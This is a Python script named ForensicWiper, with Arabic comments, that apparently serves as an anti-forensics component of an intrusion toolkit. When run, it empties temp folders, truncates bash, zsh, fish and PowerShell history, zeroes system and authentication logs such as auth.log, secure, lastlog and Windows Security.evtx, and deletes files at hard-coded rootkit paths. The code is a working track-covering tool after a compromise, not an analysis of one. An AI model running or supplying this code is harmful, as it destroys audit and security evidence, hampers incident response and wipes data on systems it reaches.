import os
import platform
import subprocess
import shutil
import logging
import time
import glob

logging.basicConfig(level=logging.INFO, format='[ForensicWiper] %(message)s')

class ForensicWiper:
    def __init__(self):
        self.os_name = platform.system().lower()
        self.is_admin = self.check_admin()
    
    def check_admin(self):
        """
        تحقق من صلاحيات المستخدم (مدير النظام)
        """
        try:
            if self.os_name == "windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except Exception:
            return False

    def wipe_temp_files(self):
        """
        يمسح الملفات المؤقتة في مجلدات النظام الشهيرة بطريقة آمنة.
        """
        logging.info("مسح الملفات المؤقتة...")
        try:
            if self.os_name == "windows":
                temp_paths = [os.environ.get("TEMP"), os.environ.get("TMP")]
                for path in temp_paths:
                    if path and os.path.exists(path):
                        self._safe_remove_dir(path)
                        os.makedirs(path, exist_ok=True)
                        logging.info(f"تم مسح محتويات: {path}")

            else:
                temp_paths = ["/tmp", "/var/tmp", "/dev/shm"]
                for path in temp_paths:
                    if os.path.exists(path):
                        self._safe_remove_dir(path)
                        logging.info(f"تم مسح محتويات: {path}")

        except Exception as e:
            logging.error(f"خطأ أثناء مسح الملفات المؤقتة: {e}")

    def _safe_remove_dir(self, path):
        """
        يحاول إزالة الملفات والمجلدات بشكل آمن ومتكرر لمنع إعادة إنشائها السريعة.
        """
        for attempt in range(3):
            try:
                for root, dirs, files in os.walk(path):
                    for f in files:
                        try:
                            os.remove(os.path.join(root, f))
                        except Exception:
                            pass
                    for d in dirs:
                        try:
                            shutil.rmtree(os.path.join(root, d), ignore_errors=True)
                        except Exception:
                            pass
                time.sleep(0.5)
            except Exception:
                pass

    def clear_command_history(self):
        """
        يمسح سجل الأوامر للسطر الحالي وملفات التاريخ.
        """
        logging.info("مسح سجل الأوامر...")

        try:
            if self.os_name == "windows":
                # مسح سجل PowerShell (إن وُجد) بالإضافة إلى cmd
                subprocess.call('cls', shell=True)
                powershell_history = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
                if os.path.exists(powershell_history):
                    open(powershell_history, 'w').close()
                    logging.info(f"تم مسح سجل PowerShell: {powershell_history}")

            else:
                # مسح bash history و zsh و fish إذا موجودة
                shells_history_files = [
                    os.path.expanduser("~/.bash_history"),
                    os.path.expanduser("~/.zsh_history"),
                    os.path.expanduser("~/.config/fish/fish_history")
                ]
                for histfile in shells_history_files:
                    if os.path.exists(histfile):
                        open(histfile, 'w').close()
                        logging.info(f"تم مسح: {histfile}")

                # محو سجل الجلسة الحالية
                subprocess.call("history -c", shell=True)
                subprocess.call("history -w", shell=True)

        except Exception as e:
            logging.error(f"خطأ أثناء مسح سجل الأوامر: {e}")

    def wipe_logs(self):
        """
        يمسح سجلات النظام والتطبيقات الشائعة، مع دعم التوسيع بسهولة.
        يستخدم glob لتحسين التعرف على الملفات المتغيرة.
        """
        logging.info("محاولة مسح سجلات محددة...")

        logs_to_clean = []

        if self.os_name != "windows":
            # استخدام glob لمسح ملفات سجلات أكثر ديناميكية
            log_patterns = [
                "/var/log/auth.log*",
                "/var/log/syslog*",
                "/var/log/kern.log*",
                "/var/log/messages*",
                "/var/log/nginx/*log*",
                "/var/log/httpd/*log*",
                "/var/log/mysql/*log*",
                "/var/log/mongodb/mongod.log*",
                "/var/log/secure*",
                "/var/log/faillog*",
                "/var/log/lastlog*",
            ]
            for pattern in log_patterns:
                logs_to_clean.extend(glob.glob(pattern))
        else:
            # سجلات ويندوز (مسارات تحتاج صلاحيات إدارية)
            logs_to_clean.extend([
                r"C:\Windows\System32\winevt\Logs\Security.evtx",
                r"C:\Windows\System32\winevt\Logs\Application.evtx",
                r"C:\Windows\System32\winevt\Logs\System.evtx",
            ])

        for logfile in logs_to_clean:
            try:
                if os.path.exists(logfile):
                    with open(logfile, 'w') as f:
                        f.truncate(0)
                    logging.info(f"تم مسح السجل: {logfile}")
            except PermissionError:
                logging.warning(f"ليس لديك صلاحيات كافية لمسح السجل: {logfile}")
            except Exception as e:
                logging.warning(f"فشل مسح السجل: {logfile} | الخطأ: {e}")

    def wipe_rootkit_traces(self):
        """
        يحاول حذف ملفات وروابط خاصة بالـ rootkits و أدوات كشف التسلل.
        """
        logging.info("محاولة مسح آثار Rootkits وأدوات كشف التسلل...")
        rootkit_paths = [
            "/usr/lib/libkeystroke.so",
            "/usr/lib/libinject.so",
            "/usr/lib/libhide.so",
            "/usr/bin/sshd2",
            "/usr/bin/xyzrootkit",
            # إضافة مسارات أخرى حسب الحاجة
        ]

        for path in rootkit_paths:
            try:
                if os.path.exists(path):
                    if os.path.isdir(path):
                        shutil.rmtree(path, ignore_errors=True)
                    else:
                        os.remove(path)
                    logging.info(f"تم مسح أثر: {path}")
            except PermissionError:
                logging.warning(f"ليس لديك صلاحيات كافية لمسح أثر: {path}")
            except Exception as e:
                logging.warning(f"فشل مسح أثر: {path} | الخطأ: {e}")

    def wipe_all(self):
        """
        تنفيذ كامل مسح الآثار مع تحذير في حالة عدم وجود صلاحيات كافية.
        """
        logging.info("بدء عملية محو الآثار المتقدمة...")
        if not self.is_admin:
            logging.warning("تنبيه: هذا البرنامج يعمل بدون صلاحيات المسؤول! بعض العمليات قد تفشل.")
        self.wipe_temp_files()
        self.clear_command_history()
        self.wipe_logs()
        self.wipe_rootkit_traces()
        logging.info("تم الانتهاء من محو الآثار بشكل متقدم.")

# للاستخدام المباشر أو الاستدعاء من النظام الرئيسي
if __name__ == "__main__":
    wiper = ForensicWiper()
    wiper.wipe_all()
